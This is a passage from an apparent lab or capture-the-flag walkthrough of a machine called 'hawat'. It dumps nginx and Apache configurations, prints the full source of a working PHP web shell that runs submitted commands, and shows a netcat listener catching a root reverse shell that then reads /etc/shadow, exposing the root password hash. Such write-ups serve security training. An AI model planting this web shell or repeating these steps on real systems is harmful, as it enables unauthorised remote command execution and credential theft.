        # deny access to .htaccess files, if Apache's document root
        # concurs with nginx's one
        #
        #location ~ /\.ht {
        #    deny  all;
	location ~ \.php$ {
	     fastcgi_pass unix:/var/run/php-fpm7/php-fpm.sock;
	     fastcgi_index index.php;
	     root /srv/http;
	     include fastcgi.conf; 
	}

        #}
    }


    # another virtual host using mix of IP-, name-, and port-based configuration
    #
    #server {
    #    listen       8000;
    #    listen       somename:8080;
    #    server_name  somename  alias  another.alias;

    #    location / {
    #        root   html;
    #        index index.php index.html index.htm;
    #    }
    #}


    # HTTPS server
    #
    #server {
    #    listen       443 ssl;
    #    server_name  localhost;

    #    ssl_certificate      cert.pem;
    #    ssl_certificate_key  cert.key;

    #    ssl_session_cache    shared:SSL:1m;
    #    ssl_session_timeout  5m;

    #    ssl_ciphers  HIGH:!aNULL:!MD5;
    #    ssl_prefer_server_ciphers  on;

    #    location / {
    #        root   html;
    #        index index.php index.html index.htm;
    #    }
    #}

}
```

`/etc/httpd/conf`

```
#
# This is the main Apache HTTP server configuration file.  It contains the
# configuration directives that give the server its instructions.
# See <URL:http://httpd.apache.org/docs/2.4/> for detailed information.
# In particular, see 
# <URL:http://httpd.apache.org/docs/2.4/mod/directives.html>
# for a discussion of each configuration directive.
#
# Do NOT simply read the instructions in here without understanding
# what they do.  They're here only as hints or reminders.  If you are unsure
# consult the online docs. You have been warned.  
#
# Configuration and logfile names: If the filenames you specify for many
# of the server's control files begin with "/" (or "drive:/" for Win32), the
# server will use that explicit path.  If the filenames do *not* begin
# with "/", the value of ServerRoot is prepended -- so "logs/access_log"
# with ServerRoot set to "/usr/local/apache2" will be interpreted by the
# server as "/usr/local/apache2/logs/access_log", whereas "/logs/access_log" 
# will be interpreted as '/logs/access_log'.

#
# ServerRoot: The top of the directory tree under which the server's
# configuration, error, and log files are kept.
#
# Do not add a slash at the end of the directory path.  If you point
# ServerRoot at a non-local disk, be sure to specify a local disk on the
# Mutex directive, if file-based mutexes are used.  If you wish to share the
# same ServerRoot for multiple httpd daemons, you will need to change at
# least PidFile.
#
ServerRoot "/etc/httpd"

#
# Mutex: Allows you to set the mutex mechanism and mutex file directory
# for individual mutexes, or change the global defaults
#
# Uncomment and change the directory if mutexes are file-based and the default
# mutex file directory is not on a local disk or is not appropriate for some
# other reason.
#
# Mutex default:/run/httpd

#
# Listen: Allows you to bind Apache to specific IP addresses and/or
# ports, instead of the default. See also the <VirtualHost>
# directive.
#
# Change this to Listen on specific IP addresses as shown below to 
# prevent Apache from glomming onto all bound IP addresses.
#
#Listen 12.34.56.78:80
Listen 50080

#
# Dynamic Shared Object (DSO) Support
#
# To be able to use the functionality of a module which was built as a DSO you
# have to place corresponding `LoadModule' lines at this location so the
# directives contained in it are actually available _before_ they are used.
# Statically compiled modules (those listed by `httpd -l') do not need
# to be loaded here.
#
# Example:
# LoadModule foo_module modules/mod_foo.so
#
#LoadModule mpm_event_module modules/mod_mpm_event.so
LoadModule mpm_prefork_module modules/mod_mpm_prefork.so
#LoadModule mpm_worker_module modules/mod_mpm_worker.so
LoadModule authn_file_module modules/mod_authn_file.so
#LoadModule authn_dbm_module modules/mod_authn_dbm.so
#LoadModule authn_anon_module modules/mod_authn_anon.so
#LoadModule authn_dbd_module modules/mod_authn_dbd.so
#LoadModule authn_socache_module modules/mod_authn_socache.so
LoadModule authn_core_module modules/mod_authn_core.so
LoadModule authz_host_module modules/mod_authz_host.so
LoadModule authz_groupfile_module modules/mod_authz_groupfile.so
LoadModule authz_user_module modules/mod_authz_user.so
#LoadModule authz_dbm_module modules/mod_authz_dbm.so
#LoadModule authz_owner_module modules/mod_authz_owner.so
#LoadModule authz_dbd_module modules/mod_authz_dbd.so
LoadModule authz_core_module modules/mod_authz_core.so
#LoadModule authnz_ldap_module modules/mod_authnz_ldap.so
#LoadModule authnz_fcgi_module modules/mod_authnz_fcgi.so
LoadModule access_compat_module modules/mod_access_compat.so
LoadModule auth_basic_module modules/mod_auth_basic.so
#LoadModule auth_form_module modules/mod_auth_form.so
#LoadModule auth_digest_module modules/mod_auth_digest.so
#LoadModule allowmethods_module modules/mod_allowmethods.so
#LoadModule file_cache_module modules/mod_file_cache.so
#LoadModule cache_module modules/mod_cache.so
#LoadModule cache_disk_module modules/mod_cache_disk.so
#LoadModule cache_socache_module modules/mod_cache_socache.so
#LoadModule socache_shmcb_module modules/mod_socache_shmcb.so
#LoadModule socache_dbm_module modules/mod_socache_dbm.so
#LoadModule socache_memcache_module modules/mod_socache_memcache.so
#LoadModule socache_redis_module modules/mod_socache_redis.so
#LoadModule watchdog_module modules/mod_watchdog.so
#LoadModule macro_module modules/mod_macro.so
#LoadModule dbd_module modules/mod_dbd.so
#LoadModule dumpio_module modules/mod_dumpio.so
#LoadModule echo_module modules/mod_echo.so
#LoadModule buffer_module modules/mod_buffer.so
#LoadModule data_module modules/mod_data.so
#LoadModule ratelimit_module modules/mod_ratelimit.so
LoadModule reqtimeout_module modules/mod_reqtimeout.so
#LoadModule ext_filter_module modules/mod_ext_filter.so
#LoadModule request_module modules/mod_request.so
LoadModule include_module modules/mod_include.so
LoadModule filter_module modules/mod_filter.so
#LoadModule reflector_module modules/mod_reflector.so
#LoadModule substitute_module modules/mod_substitute.so
#LoadModule sed_module modules/mod_sed.so
#LoadModule charset_lite_module modules/mod_charset_lite.so
#LoadModule deflate_module modules/mod_deflate.so
#LoadModule xml2enc_module modules/mod_xml2enc.so
#LoadModule proxy_html_module modules/mod_proxy_html.so
#LoadModule brotli_module modules/mod_brotli.so
LoadModule mime_module modules/mod_mime.so
#LoadModule ldap_module modules/mod_ldap.so
LoadModule log_config_module modules/mod_log_config.so
#LoadModule log_debug_module modules/mod_log_debug.so
#LoadModule log_forensic_module modules/mod_log_forensic.so
#LoadModule logio_module modules/mod_logio.so
#LoadModule lua_module modules/mod_lua.so
LoadModule env_module modules/mod_env.so
#LoadModule mime_magic_module modules/mod_mime_magic.so
#LoadModule cern_meta_module modules/mod_cern_meta.so
#LoadModule expires_module modules/mod_expires.so
LoadModule headers_module modules/mod_headers.so
#LoadModule ident_module modules/mod_ident.so
#LoadModule usertrack_module modules/mod_usertrack.so
#LoadModule unique_id_module modules/mod_unique_id.so
LoadModule setenvif_module modules/mod_setenvif.so
LoadModule version_module modules/mod_version.so
#LoadModule remoteip_module modules/mod_remoteip.so
#LoadModule proxy_module modules/mod_proxy.so
#LoadModule proxy_connect_module modules/mod_proxy_connect.so
#LoadModule proxy_ftp_module modules/mod_proxy_ftp.so
#LoadModule proxy_http_module modules/mod_proxy_http.so
#LoadModule proxy_fcgi_module modules/mod_proxy_fcgi.so
#LoadModule proxy_scgi_module modules/mod_proxy_scgi.so
#LoadModule proxy_uwsgi_module modules/mod_proxy_uwsgi.so
#LoadModule proxy_fdpass_module modules/mod_proxy_fdpass.so
#LoadModule proxy_wstunnel_module modules/mod_proxy_wstunnel.so
#LoadModule proxy_ajp_module modules/mod_proxy_ajp.so
#LoadModule proxy_balancer_module modules/mod_proxy_balancer.so
#LoadModule proxy_express_module modules/mod_proxy_express.so
#LoadModule proxy_hcheck_module modules/mod_proxy_hcheck.so
#LoadModule session_module modules/mod_session.so
#LoadModule session_cookie_module modules/mod_session_cookie.so
#LoadModule session_crypto_module modules/mod_session_crypto.so
#LoadModule session_dbd_module modules/mod_session_dbd.so
LoadModule slotmem_shm_module modules/mod_slotmem_shm.so
#LoadModule slotmem_plain_module modules/mod_slotmem_plain.so
#LoadModule ssl_module modules/mod_ssl.so
#LoadModule dialup_module modules/mod_dialup.so
#LoadModule http2_module modules/mod_http2.so
#LoadModule proxy_http2_module modules/mod_proxy_http2.so
#LoadModule md_module modules/mod_md.so
#LoadModule lbmethod_byrequests_module modules/mod_lbmethod_byrequests.so
#LoadModule lbmethod_bytraffic_module modules/mod_lbmethod_bytraffic.so
#LoadModule lbmethod_bybusyness_module modules/mod_lbmethod_bybusyness.so
#LoadModule lbmethod_heartbeat_module modules/mod_lbmethod_heartbeat.so
LoadModule unixd_module modules/mod_unixd.so
#LoadModule heartbeat_module modules/mod_heartbeat.so
#LoadModule heartmonitor_module modules/mod_heartmonitor.so
#LoadModule dav_module modules/mod_dav.so
LoadModule status_module modules/mod_status.so
LoadModule autoindex_module modules/mod_autoindex.so
#LoadModule asis_module modules/mod_asis.so
#LoadModule info_module modules/mod_info.so
#LoadModule suexec_module modules/mod_suexec.so
<IfModule !mpm_prefork_module>
	#LoadModule cgid_module modules/mod_cgid.so
</IfModule>
<IfModule mpm_prefork_module>
	#LoadModule cgi_module modules/mod_cgi.so
</IfModule>
#LoadModule dav_fs_module modules/mod_dav_fs.so
#LoadModule dav_lock_module modules/mod_dav_lock.so
#LoadModule vhost_alias_module modules/mod_vhost_alias.so
LoadModule negotiation_module modules/mod_negotiation.so
LoadModule dir_module modules/mod_dir.so
#LoadModule imagemap_module modules/mod_imagemap.so
#LoadModule actions_module modules/mod_actions.so
#LoadModule speling_module modules/mod_speling.so
LoadModule userdir_module modules/mod_userdir.so
LoadModule alias_module modules/mod_alias.so
#LoadModule rewrite_module modules/mod_rewrite.so

<IfModule unixd_module>
#
# If you wish httpd to run as a different user or group, you must run
# httpd as root initially and it will switch.  
#
# User/Group: The name (or #number) of the user/group to run httpd as.
# It is usually good practice to create a dedicated user and group for
# running httpd, as with most system services.
#
User http
Group http

</IfModule>

# 'Main' server configuration
#
# The directives in this section set up the values used by the 'main'
# server, which responds to any requests that aren't handled by a
# <VirtualHost> definition.  These values also provide defaults for
# any <VirtualHost> containers you may define later in the file.
#
# All of these directives may appear inside <VirtualHost> containers,
# in which case these default settings will be overridden for the
# virtual host being defined.
#

#
# ServerAdmin: Your address, where problems with the server should be
# e-mailed.  This address appears on some server-generated pages, such
# as error documents.  e.g. admin@your-domain.com
#
ServerAdmin you@example.com

#
# ServerName gives the name and port that the server uses to identify itself.
# This can often be determined automatically, but we recommend you specify
# it explicitly to prevent problems during startup.
#
# If your host doesn't have a registered DNS name, enter its IP address here.
#
#ServerName www.example.com:80

#
# Deny access to the entirety of your server's filesystem. You must
# explicitly permit access to web content directories in other 
# <Directory> blocks below.
#
<Directory />
    AllowOverride none
    Require all denied
</Directory>

#
# Note that from this point forward you must specifically allow
# particular features to be enabled - so if something's not working as
# you might expect, make sure that you have specifically enabled it
# below.
#

#
# DocumentRoot: The directory out of which you will serve your
# documents. By default, all requests are taken from this directory, but
# symbolic links and aliases may be used to point to other locations.
#
DocumentRoot "/srv/apache"
<Directory "/srv/apache">
    #
    # Possible values for the Options directive are "None", "All",
    # or any combination of:
    #   Indexes Includes FollowSymLinks SymLinksifOwnerMatch ExecCGI MultiViews
    #
    # Note that "MultiViews" must be named *explicitly* --- "Options All"
    # doesn't give it to you.
    #
    # The Options directive is both complicated and important.  Please see
    # http://httpd.apache.org/docs/2.4/mod/core.html#options
    # for more information.
    #
    Options Indexes FollowSymLinks

    #
    # AllowOverride controls what directives may be placed in .htaccess files.
    # It can be "All", "None", or any combination of the keywords:
    #   AllowOverride FileInfo AuthConfig Limit
    #
    AllowOverride None

    #
    # Controls who can get stuff from this server.
    #
    Require all granted
</Directory>

#
# DirectoryIndex: sets the file that Apache will serve if a directory
# is requested.
#
<IfModule dir_module>
    DirectoryIndex index.html
</IfModule>

#
# The following lines prevent .htaccess and .htpasswd files from being 
# viewed by Web clients. 
#
<Files ".ht*">
    Require all denied
</Files>

#
# ErrorLog: The location of the error log file.
# If you do not specify an ErrorLog directive within a <VirtualHost>
# container, error messages relating to that virtual host will be
# logged here.  If you *do* define an error logfile for a <VirtualHost>
# container, that host's errors will be logged there and not here.
#
ErrorLog "/var/log/httpd/error_log"

#
# LogLevel: Control the number of messages logged to the error_log.
# Possible values include: debug, info, notice, warn, error, crit,
# alert, emerg.
#
LogLevel warn

<IfModule log_config_module>
    #
    # The following directives define some format nicknames for use with
    # a CustomLog directive (see below).
    #
    LogFormat "%h %l %u %t \"%r\" %>s %b \"%{Referer}i\" \"%{User-Agent}i\"" combined
    LogFormat "%h %l %u %t \"%r\" %>s %b" common

    <IfModule logio_module>
      # You need to enable mod_logio.c to use %I and %O
      LogFormat "%h %l %u %t \"%r\" %>s %b \"%{Referer}i\" \"%{User-Agent}i\" %I %O" combinedio
    </IfModule>

    #
    # The location and format of the access logfile (Common Logfile Format).
    # If you do not define any access logfiles within a <VirtualHost>
    # container, they will be logged here.  Contrariwise, if you *do*
    # define per-<VirtualHost> access logfiles, transactions will be
    # logged therein and *not* in this file.
    #
    CustomLog "/var/log/httpd/access_log" common

    #
    # If you prefer a logfile with access, agent, and referer information
    # (Combined Logfile Format) you can use the following directive.
    #
    #CustomLog "/var/log/httpd/access_log" combined
</IfModule>

<IfModule alias_module>
    #
    # Redirect: Allows you to tell clients about documents that used to 
    # exist in your server's namespace, but do not anymore. The client 
    # will make a new request for the document at its new location.
    # Example:
    # Redirect permanent /foo http://www.example.com/bar

    #
    # Alias: Maps web paths into filesystem paths and is used to
    # access content that does not live under the DocumentRoot.
    # Example:
    # Alias /webpath /full/filesystem/path
    #
    # If you include a trailing / on /webpath then the server will
    # require it to be present in the URL.  You will also likely
    # need to provide a <Directory> section to allow access to
    # the filesystem path.

    #
    # ScriptAlias: This controls which directories contain server scripts. 
    # ScriptAliases are essentially the same as Aliases, except that
    # documents in the target directory are treated as applications and
    # run by the server when requested rather than as documents sent to the
    # client.  The same rules about trailing "/" apply to ScriptAlias
    # directives as to Alias.
    #
    ScriptAlias /cgi-bin/ "/srv/http/cgi-bin/"

</IfModule>

<IfModule cgid_module>
    #
    # ScriptSock: On threaded servers, designate the path to the UNIX
    # socket used to communicate with the CGI daemon of mod_cgid.
    #
    #Scriptsock cgisock
</IfModule>

#
# "/srv/http/cgi-bin" should be changed to whatever your ScriptAliased
# CGI directory exists, if you have that configured.
#
<Directory "/srv/http/cgi-bin">
    AllowOverride None
    Options None
    Require all granted
</Directory>

<IfModule headers_module>
    #
    # Avoid passing HTTP_PROXY environment to CGI's on this or any proxied
    # backend servers which have lingering "httpoxy" defects.
    # 'Proxy' request header is undefined by the IETF, not listed by IANA
    #
    RequestHeader unset Proxy early
</IfModule>

<IfModule mime_module>
    #
    # TypesConfig points to the file containing the list of mappings from
    # filename extension to MIME-type.
    #
    TypesConfig conf/mime.types

    #
    # AddType allows you to add to or override the MIME configuration
    # file specified in TypesConfig for specific file types.
    #
    #AddType application/x-gzip .tgz
    #
    # AddEncoding allows you to have certain browsers uncompress
    # information on the fly. Note: Not all browsers support this.
    #
    #AddEncoding x-compress .Z
    #AddEncoding x-gzip .gz .tgz
    #
    # If the AddEncoding directives above are commented-out, then you
    # probably should define those extensions to indicate media types:
    #
    AddType application/x-compress .Z
    AddType application/x-gzip .gz .tgz

    #
    # AddHandler allows you to map certain file extensions to "handlers":
    # actions unrelated to filetype. These can be either built into the server
    # or added with the Action directive (see below)
    #
    # To use CGI scripts outside of ScriptAliased directories:
    # (You will also need to add "ExecCGI" to the "Options" directive.)
    #
    #AddHandler cgi-script .cgi

    # For type maps (negotiated resources):
    #AddHandler type-map var

    #
    # Filters allow you to process content before it is sent to the client.
    #
    # To parse .shtml files for server-side includes (SSI):
    # (You will also need to add "Includes" to the "Options" directive.)
    #
    #AddType text/html .shtml
    #AddOutputFilter INCLUDES .shtml
</IfModule>

#
# The mod_mime_magic module allows the server to use various hints from the
# contents of the file itself to determine its type.  The MIMEMagicFile
# directive tells the module where the hint definitions are located.
#
#MIMEMagicFile conf/magic

#
# Customizable error responses come in three flavors:
# 1) plain text 2) local redirects 3) external redirects
#
# Some examples:
#ErrorDocument 500 "The server made a boo boo."
#ErrorDocument 404 /missing.html
#ErrorDocument 404 "/cgi-bin/missing_handler.pl"
#ErrorDocument 402 http://www.example.com/subscription_info.html
#

#
# MaxRanges: Maximum number of Ranges in a request before
# returning the entire resource, or one of the special
# values 'default', 'none' or 'unlimited'.
# Default setting is to accept 200 Ranges.
#MaxRanges unlimited

#
# EnableMMAP and EnableSendfile: On systems that support it, 
# memory-mapping or the sendfile syscall may be used to deliver
# files.  This usually improves server performance, but must
# be turned off when serving from networked-mounted 
# filesystems or if support for these functions is otherwise
# broken on your system.
# Defaults: EnableMMAP On, EnableSendfile Off
#
#EnableMMAP off
#EnableSendfile on

# Supplemental configuration
#
# The configuration files in the conf/extra/ directory can be 
# included to add extra features or to modify the default configuration of 
# the server, or you may simply copy their contents here and change as 
# necessary.

# Server-pool management (MPM specific)
Include conf/extra/httpd-mpm.conf

# Multi-language error messages
Include conf/extra/httpd-multilang-errordoc.conf

# Fancy directory listings
Include conf/extra/httpd-autoindex.conf

# Language settings
Include conf/extra/httpd-languages.conf

# User home directories
Include conf/extra/httpd-userdir.conf

# Real-time info on requests and configuration
#Include conf/extra/httpd-info.conf

# Virtual hosts
#Include conf/extra/httpd-vhosts.conf

# Local access to the Apache HTTP Server Manual
#Include conf/extra/httpd-manual.conf

# Distributed authoring and versioning (WebDAV)
#Include conf/extra/httpd-dav.conf

# Various default settings
Include conf/extra/httpd-default.conf

# Configure mod_proxy_html to understand HTML4/XHTML1
<IfModule proxy_html_module>
Include conf/extra/proxy-html.conf
</IfModule>

# Secure (SSL/TLS) connections
#Include conf/extra/httpd-ssl.conf
#
# Note: The following must must be present to support
#       starting without SSL on platforms with no /dev/random equivalent
#       but a statically compiled-in mod_ssl.
#
<IfModule ssl_module>
SSLRandomSeed startup builtin
SSLRandomSeed connect builtin
</IfModule>

LoadModule php7_module modules/libphp7.so
AddHandler php7-script php
Include conf/extra/php7_module.conf
AddType application/x-httpd-php .php
AddType application/x-httpd-php-source .phps
Include conf/extra/nextcloud.conf
```

### Web directories

`/srv/http` -> 30455

`/srv/apache` -> 50080

### Insert Webshell payload into  /srv/http

![](Pasted%20image%2020220122085458.png)

![](Pasted%20image%2020220122085608.png)


test.php

```
<?php
if (!empty($_POST['cmd'])) {
    $cmd = shell_exec($_POST['cmd']);
}
?>
<!DOCTYPE html>
<html lang="en">
<!-- By Artyum (https://github.com/artyuum) -->
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Web Shell</title>
    <style>
        * {
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
        }

        body {
            font-family: sans-serif;
            color: rgba(0, 0, 0, .75);
        }

        main {
            margin: auto;
            max-width: 850px;
        }

        pre,
        input,
        button {
            border-radius: 5px;
        }

        pre,
        input,
        button {
            background-color: #efefef;
        }

        label {
            display: block;
        }

        input {
            width: 100%;
            background-color: #efefef;
            border: 2px solid transparent;
        }

        input:focus {
            outline: none;
            background: transparent;
            border: 2px solid #e6e6e6;
        }

        button {
            border: none;
            cursor: pointer;
            margin-left: 5px;
        }

        button:hover {
            background-color: #e6e6e6;
        }

        pre,
        input,
        button {
            padding: 10px;
        }

        .form-group {
            display: -webkit-box;
            display: -ms-flexbox;
            display: flex;
            padding: 15px 0;
        }
    </style>

</head>

<body>
    <main>
        <h1>Web Shell</h1>
        <h2>Execute a command</h2>

        <form method="post">
            <label for="cmd"><strong>Command</strong></label>
            <div class="form-group">
                <input type="text" name="cmd" id="cmd" value="<?= htmlspecialchars($_POST['cmd'], ENT_QUOTES, 'UTF-8') ?>"
                       onfocus="this.setSelectionRange(this.value.length, this.value.length);" autofocus required>
                <button type="submit">Execute</button>
            </div>
        </form>

        <?php if ($_SERVER['REQUEST_METHOD'] === 'POST'): ?>
            <h2>Output</h2>
            <?php if (isset($cmd)): ?>
                <pre><?= htmlspecialchars($cmd, ENT_QUOTES, 'UTF-8') ?></pre>
            <?php else: ?>
                <pre><small>No result.</small></pre>
            <?php endif; ?>
        <?php endif; ?>
    </main>
</body>
</html>
```

## 17445 - Web - Issue Tracker

![](Pasted%20image%2020220122083020.png)

Create a new account `admin`:`admin`, and log in

![](Pasted%20image%2020220122083051.png)

![](Pasted%20image%2020220122082544.png)


# Exploitation

After inserting web shell payload

![](Pasted%20image%2020220122085752.png)

![](Pasted%20image%2020220122090009.png)

```
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 50080            
listening on [any] 50080 ...
connect to [192.168.49.196] from (UNKNOWN) [192.168.196.147] 60288

whoami

```



![](Pasted%20image%2020220122090118.png)


```
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 50080                                                                                                                                                  1 ⨯
listening on [any] 50080 ...
connect to [192.168.49.196] from (UNKNOWN) [192.168.196.147] 60292
bash: cannot set terminal process group (290): Inappropriate ioctl for device
bash: no job control in this shell
[root@hawat http]# cd /root
cd /root
[root@hawat ~]# cat proof.txt
cat proof.txt
e9a72fa14496844c6ae76d7ac57db629
[root@hawat ~]# ifconfig
ifconfig
ens160: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.196.147  netmask 255.255.255.0  broadcast 192.168.196.255
        inet6 fe80::250:56ff:febf:b2cf  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:bf:b2:cf  txqueuelen 1000  (Ethernet)
        RX packets 66334  bytes 12846561 (12.2 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 57038  bytes 69759783 (66.5 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 6696  bytes 925585 (903.8 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 6696  bytes 925585 (903.8 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

[root@hawat ~]# 

```
# Others

```
[root@hawat clinton]# cat /etc/shadow
cat /etc/shadow
root:$6$LRw43gk0AlKusVST$9XxnQaSlM4FWMQCLbNjEOg.hmDZY4wQPuLx0fFkYEtMnctU3L5ZkNPmmJeELqaWJYICXTKvwmS59R.AdvMHn//:18668::::::
bin:!*:18662::::::
daemon:!*:18662::::::
mail:!*:18662::::::
ftp:!*:18662::::::
http:!*:18662::::::
nobody:!*:18662::::::
dbus:!*:18662::::::
systemd-journal-remote:!*:18662::::::
systemd-network:!*:18662::::::
systemd-resolve:!*:18662::::::
systemd-timesync:!*:18662::::::
systemd-coredump:!*:18662::::::
uuidd:!*:18662::::::
dhcpcd:!*:18668::::::
clinton:!:18668:0:99999:7:::
mysql:!*:18668::::::
[root@hawat clinton]# 

```

